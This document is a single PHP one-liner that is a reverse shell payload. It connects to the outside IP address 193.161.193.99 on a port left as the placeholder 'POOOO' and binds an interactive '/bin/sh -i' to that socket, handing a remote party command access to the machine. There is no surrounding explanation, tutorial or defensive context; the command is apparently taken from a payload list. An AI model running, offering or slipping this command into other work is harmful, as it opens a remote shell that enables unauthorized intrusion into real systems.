php -r '$sock=fsockopen("193.161.193.99",POOOO);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
